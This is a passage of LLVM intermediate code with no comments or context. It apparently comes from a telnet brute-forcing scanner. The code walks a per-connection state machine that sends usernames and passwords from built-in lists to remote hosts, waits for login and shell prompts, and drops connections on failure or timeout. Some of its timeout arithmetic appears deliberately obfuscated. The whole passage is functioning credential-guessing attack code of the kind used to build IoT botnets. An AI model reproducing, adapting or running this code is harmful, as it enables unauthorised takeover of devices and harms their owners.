  %496 = load i32, i32* %495, align 4
  %497 = sub i32 0, 30
  %498 = sub i32 %496, %497
  %499 = add i32 %496, 30
  %500 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %501 = icmp ult i32 %498, %500
  br i1 %501, label %502, label %517

; <label>:502:                                    ; preds = %491
  %503 = load i32, i32* %2, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 16
  %508 = call i32 @sclose(i32 %507)
  %509 = load i32, i32* %2, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %511, i32 0, i32 2
  store i8 0, i8* %512, align 8
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 3
  store i8 1, i8* %516, align 1
  br label %517

; <label>:517:                                    ; preds = %502, %491
  br label %1024

; <label>:518:                                    ; preds = %71
  %519 = load i32, i32* %2, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 0
  %523 = load i32, i32* %522, align 16
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 4
  %528 = load i8, i8* %527, align 2
  %529 = zext i8 %528 to i64
  %530 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %529
  %531 = load i8*, i8** %530, align 8
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 4
  %536 = load i8, i8* %535, align 2
  %537 = zext i8 %536 to i64
  %538 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %537
  %539 = load i8*, i8** %538, align 8
  %540 = call i64 @strlen(i8* %539) #10
  %541 = call i64 @send(i32 %523, i8* %531, i64 %540, i32 16384)
  %542 = icmp slt i64 %541, 0
  br i1 %542, label %543, label %558

; <label>:543:                                    ; preds = %518
  %544 = load i32, i32* %2, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %545
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %546, i32 0, i32 0
  %548 = load i32, i32* %547, align 16
  %549 = call i32 @sclose(i32 %548)
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 2
  store i8 0, i8* %553, align 8
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 3
  store i8 1, i8* %557, align 1
  br label %1025

; <label>:558:                                    ; preds = %518
  %559 = load i32, i32* %2, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 16
  %564 = call i64 @send(i32 %563, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.28, i32 0, i32 0), i64 2, i32 16384)
  %565 = icmp slt i64 %564, 0
  br i1 %565, label %566, label %581

; <label>:566:                                    ; preds = %558
  %567 = load i32, i32* %2, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 0
  %571 = load i32, i32* %570, align 16
  %572 = call i32 @sclose(i32 %571)
  %573 = load i32, i32* %2, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 2
  store i8 0, i8* %576, align 8
  %577 = load i32, i32* %2, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %578
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %579, i32 0, i32 3
  store i8 1, i8* %580, align 1
  br label %1025

; <label>:581:                                    ; preds = %558
  %582 = load i32, i32* %2, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 2
  store i8 4, i8* %585, align 8
  br label %1024

; <label>:586:                                    ; preds = %71
  %587 = load i32, i32* %2, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 6
  %591 = load i32, i32* %590, align 4
  %592 = icmp eq i32 %591, 0
  br i1 %592, label %593, label %599

; <label>:593:                                    ; preds = %586
  %594 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 6
  store i32 %594, i32* %598, align 4
  br label %599

; <label>:599:                                    ; preds = %593, %586
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 0
  %604 = load i32, i32* %603, align 16
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 8
  %609 = load i8*, i8** %608, align 8
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 7
  %614 = load i16, i16* %613, align 16
  %615 = zext i16 %614 to i32
  %616 = call i32 @readUntil(i32 %604, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %609, i32 1024, i32 %615)
  %617 = icmp ne i32 %616, 0
  br i1 %617, label %618, label %650

; <label>:618:                                    ; preds = %599
  %619 = load i32, i32* %2, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %620
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %621, i32 0, i32 6
  store i32 0, i32* %622, align 4
  %623 = load i32, i32* %2, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %624
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %625, i32 0, i32 7
  store i16 0, i16* %626, align 16
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 8
  %631 = load i8*, i8** %630, align 8
  %632 = call i8* @strstr(i8* %631, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %633 = icmp ne i8* %632, null
  br i1 %633, label %634, label %639

; <label>:634:                                    ; preds = %618
  %635 = load i32, i32* %2, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 2
  store i8 5, i8* %638, align 8
  br label %644

; <label>:639:                                    ; preds = %618
  %640 = load i32, i32* %2, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 2
  store i8 7, i8* %643, align 8
  br label %644

; <label>:644:                                    ; preds = %639, %634
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 8
  %649 = load i8*, i8** %648, align 8
  call void @llvm.memset.p0i8.i64(i8* %649, i8 0, i64 1024, i32 1, i1 false)
  br label %1025

; <label>:650:                                    ; preds = %599
  %651 = load i32, i32* %2, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 8
  %655 = load i8*, i8** %654, align 8
  %656 = call i8* @strstr(i8* %655, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)) #10
  %657 = icmp ne i8* %656, null
  br i1 %657, label %658, label %673

; <label>:658:                                    ; preds = %650
  %659 = load i32, i32* %2, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 0
  %663 = load i32, i32* %662, align 16
  %664 = call i32 @sclose(i32 %663)
  %665 = load i32, i32* %2, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %666
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %667, i32 0, i32 2
  store i8 0, i8* %668, align 8
  %669 = load i32, i32* %2, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %670
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %671, i32 0, i32 3
  store i8 0, i8* %672, align 1
  br label %1025

; <label>:673:                                    ; preds = %650
  %674 = load i32, i32* %2, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 8
  %678 = load i8*, i8** %677, align 8
  %679 = call i64 @strlen(i8* %678) #10
  %680 = trunc i64 %679 to i16
  %681 = load i32, i32* %2, align 4
  %682 = sext i32 %681 to i64
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %682
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %683, i32 0, i32 7
  store i16 %680, i16* %684, align 16
  br label %685

; <label>:685:                                    ; preds = %673
  %686 = load i32, i32* %2, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 6
  %690 = load i32, i32* %689, align 4
  %691 = add i32 %690, 140170785
  %692 = add i32 %691, 8
  %693 = sub i32 %692, 140170785
  %694 = add i32 %690, 8
  %695 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %696 = icmp ult i32 %693, %695
  br i1 %696, label %697, label %712

; <label>:697:                                    ; preds = %685
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 0
  %702 = load i32, i32* %701, align 16
  %703 = call i32 @sclose(i32 %702)
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 2
  store i8 0, i8* %707, align 8
  %708 = load i32, i32* %2, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 3
  store i8 1, i8* %711, align 1
  br label %712

; <label>:712:                                    ; preds = %697, %685
  br label %1024

; <label>:713:                                    ; preds = %71
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 0
  %718 = load i32, i32* %717, align 16
  %719 = load i32, i32* %2, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 5
  %723 = load i8, i8* %722, align 1
  %724 = zext i8 %723 to i64
  %725 = getelementptr inbounds [16 x i8*], [16 x i8*]* @passwords, i64 0, i64 %724
  %726 = load i8*, i8** %725, align 8
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 5
  %731 = load i8, i8* %730, align 1
  %732 = zext i8 %731 to i64
  %733 = getelementptr inbounds [16 x i8*], [16 x i8*]* @passwords, i64 0, i64 %732
  %734 = load i8*, i8** %733, align 8
  %735 = call i64 @strlen(i8* %734) #10
  %736 = call i64 @send(i32 %718, i8* %726, i64 %735, i32 16384)
  %737 = icmp slt i64 %736, 0
  br i1 %737, label %738, label %753

; <label>:738:                                    ; preds = %713
  %739 = load i32, i32* %2, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = call i32 @sclose(i32 %743)
  %745 = load i32, i32* %2, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 2
  store i8 0, i8* %748, align 8
  %749 = load i32, i32* %2, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %750
  %752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %751, i32 0, i32 3
  store i8 1, i8* %752, align 1
  br label %1025

; <label>:753:                                    ; preds = %713
  %754 = load i32, i32* %2, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 16
  %759 = call i64 @send(i32 %758, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.28, i32 0, i32 0), i64 2, i32 16384)
  %760 = icmp slt i64 %759, 0
  br i1 %760, label %761, label %776

; <label>:761:                                    ; preds = %753
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 0
  %766 = load i32, i32* %765, align 16
  %767 = call i32 @sclose(i32 %766)
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 2
  store i8 0, i8* %771, align 8
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 3
  store i8 1, i8* %775, align 1
  br label %1025

; <label>:776:                                    ; preds = %753
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 2
  store i8 6, i8* %780, align 8
  br label %1024

; <label>:781:                                    ; preds = %71
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 6
  %786 = load i32, i32* %785, align 4
  %787 = icmp eq i32 %786, 0
  br i1 %787, label %788, label %794

; <label>:788:                                    ; preds = %781
  %789 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %790 = load i32, i32* %2, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 6
  store i32 %789, i32* %793, align 4
  br label %794

; <label>:794:                                    ; preds = %788, %781
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 0
  %799 = load i32, i32* %798, align 16
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 8
  %804 = load i8*, i8** %803, align 8
  %805 = load i32, i32* %2, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 7
  %809 = load i16, i16* %808, align 16
  %810 = zext i16 %809 to i32
  %811 = call i32 @readUntil(i32 %799, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %804, i32 1024, i32 %810)
  %812 = icmp ne i32 %811, 0
  br i1 %812, label %813, label %888

; <label>:813:                                    ; preds = %794
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 6
  store i32 0, i32* %817, align 4
  %818 = load i32, i32* %2, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 7
  store i16 0, i16* %821, align 16
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 8
  %826 = load i8*, i8** %825, align 8
  %827 = call i8* @strstr(i8* %826, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)) #10
  %828 = icmp ne i8* %827, null
  br i1 %828, label %829, label %849

; <label>:829:                                    ; preds = %813
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 8
  %834 = load i8*, i8** %833, align 8
  call void @llvm.memset.p0i8.i64(i8* %834, i8 0, i64 1024, i32 1, i1 false)
  %835 = load i32, i32* %2, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 16
  %840 = call i32 @sclose(i32 %839)
  %841 = load i32, i32* %2, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 2
  store i8 0, i8* %844, align 8
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 3
  store i8 0, i8* %848, align 1
  br label %1025

; <label>:849:                                    ; preds = %813
  %850 = load i32, i32* %2, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %851
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %852, i32 0, i32 8
  %854 = load i8*, i8** %853, align 8
  %855 = call i32 @matchPrompt(i8* %854)
  %856 = icmp ne i32 %855, 0
  br i1 %856, label %877, label %857

; <label>:857:                                    ; preds = %849
  %858 = load i32, i32* %2, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %859
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %860, i32 0, i32 8
  %862 = load i8*, i8** %861, align 8
  call void @llvm.memset.p0i8.i64(i8* %862, i8 0, i64 1024, i32 1, i1 false)
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 0
  %867 = load i32, i32* %866, align 16
  %868 = call i32 @sclose(i32 %867)
  %869 = load i32, i32* %2, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 2
  store i8 0, i8* %872, align 8
  %873 = load i32, i32* %2, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 3
  store i8 1, i8* %876, align 1
  br label %1025

; <label>:877:                                    ; preds = %849
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 2
  store i8 7, i8* %881, align 8
  br label %882

; <label>:882:                                    ; preds = %877
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 8
  %887 = load i8*, i8** %886, align 8
  call void @llvm.memset.p0i8.i64(i8* %887, i8 0, i64 1024, i32 1, i1 false)
  br label %1025

; <label>:888:                                    ; preds = %794
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 8
  %893 = load i8*, i8** %892, align 8
  %894 = call i64 @strlen(i8* %893) #10
  %895 = trunc i64 %894 to i16
  %896 = load i32, i32* %2, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 7
  store i16 %895, i16* %899, align 16
  br label %900

; <label>:900:                                    ; preds = %888
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 6
  %905 = load i32, i32* %904, align 4
  %906 = sub i32 0, 30
  %907 = sub i32 %905, %906
  %908 = add i32 %905, 30
  %909 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %910 = icmp ult i32 %907, %909
  br i1 %910, label %911, label %926

; <label>:911:                                    ; preds = %900
  %912 = load i32, i32* %2, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %913
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %914, i32 0, i32 0
  %916 = load i32, i32* %915, align 16
  %917 = call i32 @sclose(i32 %916)
  %918 = load i32, i32* %2, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %919
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %920, i32 0, i32 2
  store i8 0, i8* %921, align 8
  %922 = load i32, i32* %2, align 4
  %923 = sext i32 %922 to i64
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %923
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %924, i32 0, i32 3
  store i8 1, i8* %925, align 1
  br label %926

; <label>:926:                                    ; preds = %911, %900
  br label %1024

; <label>:927:                                    ; preds = %71
  %928 = load i32, i32* %2, align 4
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 0
  %932 = load i32, i32* %931, align 16
  %933 = call i64 @send(i32 %932, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i64 4, i32 16384)
  %934 = icmp slt i64 %933, 0
  br i1 %934, label %935, label %950

; <label>:935:                                    ; preds = %927
  %936 = load i32, i32* %2, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 0
  %940 = load i32, i32* %939, align 16
  %941 = call i32 @sclose(i32 %940)
  %942 = load i32, i32* %2, align 4
  %943 = sext i32 %942 to i64
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %943
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %944, i32 0, i32 2
  store i8 0, i8* %945, align 8
  %946 = load i32, i32* %2, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 3
  store i8 1, i8* %949, align 1
  br label %1025

; <label>:950:                                    ; preds = %927
  %951 = load i32, i32* %2, align 4
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %952
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %953, i32 0, i32 2
  store i8 8, i8* %954, align 8
  br label %1024

; <label>:955:                                    ; preds = %71
  %956 = load i32, i32* %2, align 4
  %957 = sext i32 %956 to i64
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %957
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %958, i32 0, i32 6
  %960 = load i32, i32* %959, align 4
  %961 = icmp eq i32 %960, 0
  br i1 %961, label %962, label %968

; <label>:962:                                    ; preds = %955
  %963 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 6
  store i32 %963, i32* %967, align 4
  br label %968

; <label>:968:                                    ; preds = %962, %955
  %969 = load i32, i32* %2, align 4
